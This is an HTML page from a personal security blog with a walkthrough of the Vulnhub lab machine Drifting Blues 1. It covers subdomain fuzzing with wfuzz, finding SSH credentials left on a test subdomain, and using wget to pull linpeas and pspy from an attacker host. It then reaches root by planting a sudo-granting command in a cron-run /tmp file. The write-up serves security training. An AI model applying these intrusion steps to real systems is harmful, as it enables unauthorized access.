<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=content-language content="en"><meta name=color-scheme content="light dark"><meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;"><meta name=author content="Kiel Vaughn"><meta name=description content="Drifting Blues 1 Drifting Blues is the first in a series of 9 boxes on Vulnhub.
User Hints Have you looked at the website's source code? Searching for the word listed over and over in the note will help you decode it. What can you do to enumerate subdomains on a website? What file is used to prevent crawling of websites? Try this out on the uncovered subdomain. Root Hints What tool can you use to enumerate processes running on this system?"><meta name=keywords content="blog,cybersecurity,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="Drifting Blues 1"><meta name=twitter:description content="Drifting Blues 1 Drifting Blues is the first in a series of 9 boxes on Vulnhub.
User Hints Have you looked at the website's source code? Searching for the word listed over and over in the note will help you decode it. What can you do to enumerate subdomains on a website? What file is used to prevent crawling of websites? Try this out on the uncovered subdomain. Root Hints What tool can you use to enumerate processes running on this system?"><meta property="og:title" content="Drifting Blues 1"><meta property="og:description" content="Drifting Blues 1 Drifting Blues is the first in a series of 9 boxes on Vulnhub.
User Hints Have you looked at the website's source code? Searching for the word listed over and over in the note will help you decode it. What can you do to enumerate subdomains on a website? What file is used to prevent crawling of websites? Try this out on the uncovered subdomain. Root Hints What tool can you use to enumerate processes running on this system?"><meta property="og:type" content="article"><meta property="og:url" content="https://www.kielvaughn.com/ctfs/2021-05-15-drifting-blues-1/"><meta property="article:section" content="ctfs"><meta property="article:published_time" content="2021-05-15T00:00:00+00:00"><meta property="article:modified_time" content="2021-05-15T00:00:00+00:00"><title>Drifting Blues 1 · Kiel Vaughn, CISSP</title><link rel=canonical href=https://www.kielvaughn.com/ctfs/2021-05-15-drifting-blues-1/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.708686f8ab8176e91d44fcbe488a0fe0333b94f405cf18a52383d67ba22f0ccb.css integrity="sha256-cIaG+KuBdukdRPy+SIoP4DM7lPQFzxilI4PWe6IvDMs=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.aa883b9ce35a8ff4a2a5008619005175e842bb18a8a9f9cc2bbcf44dab2d91fa.css integrity="sha256-qog7nONaj/SipQCGGQBRdehCuxioqfnMK7z0Tastkfo=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32><link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16><link rel=apple-touch-icon href=/assets/img/cissp.ico><link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico><meta name=generator content="Hugo 0.104.3"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Kiel Vaughn, CISSP</a>
<input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/whoami/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/certifications/>certifications</a></li><li class=navigation-item><a class=navigation-link href=/posts/>blog</a></li><li class=navigation-item><a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://www.kielvaughn.com/ctfs/2021-05-15-drifting-blues-1/>Drifting Blues 1</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa fa-calendar" aria-hidden=true></i>
<time datetime=2021-05-15T00:00:00Z>May 15, 2021</time></span>
<span class=reading-time><i class="fa fa-clock-o" aria-hidden=true></i>
5-minute read</span></div><div class=tags><i class="fa fa-tag" aria-hidden=true></i>
<span class=tag><a href=/tags/dns-enumeration/>DNS enumeration</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/website-enumeration/>website enumeration</a></span>
<span class=separator>•</span>
<span class=tag><a href=/tags/crontab/>crontab</a></span></div></div></header><div><h1 id=drifting-blues-1>Drifting Blues 1
<a class=heading-link href=#drifting-blues-1><i class="fa fa-link" aria-hidden=true></i></a></h1><p>Drifting Blues is the first in a series of 9 boxes on <a href=https://www.vulnhub.com/series/driftingblues,424/>Vulnhub</a>.</p><details><summary><strong>User Hints</strong></summary><ul><li>Have you looked at the website's source code?<li>Searching for the word listed over and over in the note will help you decode it.<li>What can you do to enumerate subdomains on a website?<li>What file is used to prevent crawling of websites? Try this out on the uncovered subdomain.</ul></details><details><summary><strong>Root Hints</strong></summary><ul><li>What tool can you use to enumerate processes running on this system?<li>Are there any processes running on this system that can be abused?</ul></details><h2 id=walkthrough>Walkthrough
<a class=heading-link href=#walkthrough><i class="fa fa-link" aria-hidden=true></i></a></h2><details><summary><strong>Full Walkthrough</strong></summary>
First, let's find the IP address of the host by utilizing:<p><strong><code>netdiscover -i eth0</code></strong></p><p>from our Kali host. After a few moments, you should be able to uncover the IP of our target system.</p><p><img src=/assets/img/driftingblues-1-1.png alt="Drifting Blues 1 netdiscover"></p><p>Once you have discovered the IP, let&rsquo;s enumerate this host to determine what ports/services are open/running. To do this, let&rsquo;s run:</p><p><strong><code>threader3000</code></strong></p><p>and enter the IP uncovered by netdiscover when prompted:</p><p><img src=/assets/img/driftingblues-1-2.png alt="Drifting Blues 1 threader3000"></p><p>Once it has completed, let it run it&rsquo;s recommended nmap scan:</p><p><img src=/assets/img/driftingblues-1-3.png alt="Drifting Blues 1 nmap"></p><p>It appears that we have SSH and an web server running on this box. Let&rsquo;s first take a look at the web server and open it up in a browser:</p><p><img src=/assets/img/driftingblues-1-4.png alt="Drifting Blues 1 website"></p><p>Next, I ran:</p><p><strong><code>python3 dirsearch.py -u http://&lt;target ip></code></strong></p><p>to attempt to find hidden directories/files, but nothing showed up:</p><p><img src=/assets/img/driftingblues-1-5.png alt="Drifting Blues 1 dirsearch"></p><p>Next, I looked at the source code on the main page of the website:</p><p><img src=/assets/img/driftingblues-1-6.png alt="Drifting Blues 1 source code"></p><p>It appears that this comment is base64 encoded, let&rsquo;s decode it to see what it reveals (I utilized <a href=http://gchq.github.io/CyberChef/>CyberChef</a> for this:</p><p><img src=/assets/img/driftingblues-1-7.png alt="Drifting Blues 1 base64 decode"></p><p>Next, I navigated to the file on the website decoded above and was presented with the following:</p><p><img src=/assets/img/driftingblues-1-8.png alt="Drifting Blues 1 Ook"></p><p>It appears to be some sort of encoding. I did a bit of research and came across the following <a href=https://www.splitbrain.org/_static/ook/>site</a> to decode this:</p><p><img src=/assets/img/driftingblues-1-9.png alt="Drifting Blues 1 Ook Decoder"></p><p>I then copied/pasted the text from the text file and decoded it, where I saw the following message:</p><p><img src=/assets/img/driftingblues-1-10.png alt="Drifting Blues 1 Ook decoded message"></p><p>This mentions a secret location that needs to be added to a host file. Let&rsquo;s search around and see if we can find the domain name on the website somewhere:</p><p><img src=/assets/img/driftingblues-1-11.png alt="Drifting Blues 1 website review"></p><p>After looking at the pages on the website, there&rsquo;s a email listed with a domain name of <strong>driftingblues.box</strong>. Let&rsquo;s add that to our host file on our attacker box with:</p><p><strong><code>sudo /etc/hosts</code></strong></p><p><img src=/assets/img/driftingblues-1-12.png alt="Drifting Blues 1 hosts file"></p><p>Next, let&rsquo;s navigate to <a href=http://driftingblues.box>http://driftingblues.box</a> in our browser to confirm it works as expected:</p><p><img src=/assets/img/driftingblues-1-13.png alt="Drifting Blues 1 website"></p><p>It does, let&rsquo;s attempt to enumerate subdomains with wfuzz. The command to use is as follows:</p><p><strong><code>wfuzz -c -Z -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://driftingblues.box" -H "Host: FUZZ.driftingblues.box" -t 50</code></strong></p><p>This will attempt to fuzz subdomains using the supplied list. We receive several results as shown below:</p><p><img src=/assets/img/driftingblues-1-14.png alt="Drifting Blues 1 wfuzz 1"></p><p>It appears that most of these redirect to the main site (which is 570 words, 7710 characters). Let&rsquo;s exclude these by using the &ndash;hw flag which acts as a filter to filter out the number of words supplied (in this case, 570)</p><p><strong><code>wfuzz -c -Z -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://driftingblues.box" -H "Host: FUZZ.driftingblues.box" -t 50 -hw 570</code></strong></p><p>This leaves us with one subdomain: <strong>test</strong></p><p><img src=/assets/img/driftingblues-1-15.png alt="Drifting Blues 1 wfuzz 2"></p><p>Let&rsquo;s add <strong>test.driftingblues.box</strong> to our hosts file by running:</p><p><strong><code>nano /etc/hosts</code></strong></p><p><img src=/assets/img/driftingblues-1-16.png alt="Drifting Blues 1 /etc/hosts test subdomain"></p><p>Next, let&rsquo;s navigate to <strong><a href=http://test.driftingblues.box>http://test.driftingblues.box</a></strong></p><p><img src=/assets/img/driftingblues-1-17.png alt="Drifting Blues 1 test site"></p><p>It appears this is a test site that is currently being built. Let&rsquo;s run:</p><p><strong><code>python3 dirsearch.py -u http://test.driftingblues.box</code></strong></p><p><img src=/assets/img/driftingblues-1-18.png alt="Drifting Blues 1 dirsearch test subdomain"></p><p>We will see that there is a robots.txt file listed for this subdomain. Let&rsquo;s visit it in our browser:</p><p><img src=/assets/img/driftingblues-1-19.png alt="Drifting Blues 1 robots.txt"></p><p>Let&rsquo;s look at the <strong>/ssh_cred.txt</strong> file:</p><p><img src=/assets/img/driftingblues-1-20.png alt="Drifting Blues 1 ssh_cred.txt"></p><p>The username was a guess on my part, as we knew we had sheryl, eric, and db as users based on the notes uncovered so far. The user ended up being eric, and after a few attempts, we were able to get logged in with <strong>1mw4ckyyucky6</strong> as the password:</p><p><img src=/assets/img/driftingblues-1-21.png alt=driftingblues-1-21></p><p>From here, we can run:</p><p><strong><code>cat user.txt</code></strong></p><p>to uncover the user flag.</p><p><img src=/assets/img/driftingblues-1-22.png alt="Drifting Blues 1 user.txt"></p><p>Next, let&rsquo;s do some enumeration and see what we can do to escalate our privileges to root. On our attacker host, let&rsquo;s server up an http server in python with:</p><p><strong><code>python3 -m http.server</code></strong></p><p><img src=/assets/img/driftingblues-1-23.png alt="Drifting Blues 1 python http server"></p><p>On our victim box, let&rsquo;s navigate to the tmp directory with:</p><p><strong><code>cd tmp</code></strong></p><p>followed by:</p><p><strong><code>wget http://&lt;attacker ip>:8000/linpeas.sh</code></strong></p><p>This will download the linpeas.sh script that is well known for it&rsquo;s enumeration capabilities.</p><p>Once downloaded, let&rsquo;s run:</p><p><strong><code>chmod +x linpeas.sh</code></strong></p><p>so the script can be executed.</p><p><img src=/assets/img/driftingblues-1-24.png alt="Drifting Blues 1 wget"></p><p>Next, let&rsquo;s run the script with:</p><p><strong><code>./linpeas.sh</code></strong></p><p><img src=/assets/img/driftingblues-1-25.png alt="Drifting Blues 1 linpeas.sh"></p><p>It appears that the path may be abused, but before I went down that route, I decided to download pspy64 to have it enumerate processes that are running. To download this and make it executable, I ran:</p><p><strong><code>wget http://&lt;attacker ip>:8000/pspy64</code></strong></p><p>on the victim host followed by:</p><p><strong><code>chmod +x pspy64</code></strong></p><p>to make it executable.</p><p><img src=/assets/img/driftingblues-1-26.png alt="Drifting Blues 1 wget2"></p><p>Next, I ran pspy64 with:</p><p><strong><code>./pspy64</code></strong></p><p><img src=/assets/img/driftingblues-1-27.png alt="Drifting Blues 1 pspy"></p><p>After a few moments, it showed me that <strong>/tmp/emergency</strong> was being ran with sudo privileges every minute. I navigated to the /tmp directory with:</p><p><strong><code>cd /tmp</code></strong></p><p>and the emergency file was not present. I then ran:</p><p><strong><code>nano emergency</code></strong></p><p>and added in</p><p><strong><code>sudo usermod -aG sudo eric</code></strong></p><p>to add eric to the list of sudo users:</p><p><img src=/assets/img/driftingblues-1-28.png alt="Drifting Blues 1 emergency file"></p><p>Next, after saving this file, I made it executable with:</p><p><strong><code>chmod +x emergency</code></strong></p><p><img src=/assets/img/driftingblues-1-29.png alt="Drifting Blues 1 chmod emergency"></p><p>Next, I waited a couple of minutes (as this script runs every minute), and then used:</p><p><strong><code>sudo su</code></strong></p><p>to escalate my privileges to root. I then ran the following commands:</p><p><strong><code>**cd /root</code></strong>**</p><p><strong><code>ls</code></strong></p><p><strong><code>cat root.txt</code></strong></p><p><img src=/assets/img/driftingblues-1-30.png alt="Drifting Blues 1 root"></p><p>That&rsquo;s it! After finding the root flag we&rsquo;ve completed this box.</p></details></div><footer></footer></article></section></div><footer class=footer><section class=container>©
2020 -
2022
Kiel Vaughn</section></footer></main><script src=/js/coder.min.cb0c595e02234420f3ad3886bf4a9bd2874d0e1e78e090138a9ef158b35aaf17.js integrity="sha256-ywxZXgIjRCDzrTiGv0qb0odNDh544JATip7xWLNarxc="></script></body></html>